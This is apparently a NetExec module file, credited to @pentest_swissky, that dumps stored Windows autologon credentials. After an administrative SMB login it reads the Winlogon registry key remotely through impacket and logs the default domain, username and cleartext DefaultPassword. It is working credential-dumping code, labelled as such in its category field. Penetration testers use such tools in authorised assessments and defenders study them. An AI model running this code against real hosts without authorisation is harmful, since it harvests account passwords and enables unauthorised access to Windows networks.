from dataclasses import dataclass

from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from nxc.helpers.misc import CATEGORY
from nxc.helpers.registry import RegistryValue
from nxc.playbooks.results import ActionResult, ResultStatus


class NXCModule:
    r"""
    WinLogon AutoLogon: extract the credential from the following registry hive
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    Module by @pentest_swissky
    """

    name = "reg-winlogon"
    description = "Collect autologon credential stored in the registry"
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING
    value_names = ("AutoAdminLogon", "DefaultDomainName", "DefaultUserName", "DefaultPassword")

    @dataclass
    class ResultData:
        values: dict[str, RegistryValue]
        queried_names: list[str]

    result_type = ResultData

    def options(self, context, module_options):
        """No options available."""

    def on_admin_login(self, context, connection):
        values = {}
        queried_names, errors, handles = [], [], []
        remote_ops = None
        try:
            remote_ops = RemoteOperations(connection.conn, False)
            remote_ops.enableRegistry()
            rpc = remote_ops._RemoteOperations__rrp
            root = rrp.hOpenLocalMachine(rpc)["phKey"]
            handles.append(root)
            key = rrp.hBaseRegOpenKey(rpc, root, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon")["phkResult"]
            handles.append(key)
            for name in self.value_names:
                observation = RegistryValue()
                values[name] = observation
                queried_names.append(name)
                try:
                    observation.registry_type, observation.value = rrp.hBaseRegQueryValue(rpc, key, name)
                    observation.present = True
                    context.log.highlight(f"{name}: {observation.value}")
                except rrp.DCERPCSessionError as e:
                    if e.get_error_code() == 2:
                        context.log.highlight(f"{name}: (not present)")
                    else:
                        observation.error = str(e)
                        errors.append(f"{name}: {e}")
                        break
                except Exception as e:
                    observation.error = str(e) or type(e).__name__
                    errors.append(f"{name}: {observation.error}")
                    break
        except Exception as e:
            errors.append(str(e) or type(e).__name__)
        finally:
            for handle in reversed(handles):
                try:
                    rrp.hBaseRegCloseKey(rpc, handle)
                except Exception as e:
                    errors.append(f"Closing registry handle: {e}")
            if remote_ops is not None:
                try:
                    remote_ops.finish()
                except Exception as e:
                    errors.append(f"Finishing registry operation: {e}")
        for error in errors:
            context.log.fail(error)
        return ActionResult(
            "smb", self.name, connection.host,
            ResultStatus.FAILED if errors else ResultStatus.SUCCESS if any(value.present for value in values.values()) else ResultStatus.NEGATIVE,
            self.ResultData(values, queried_names), error="; ".join(errors) or None,
        )
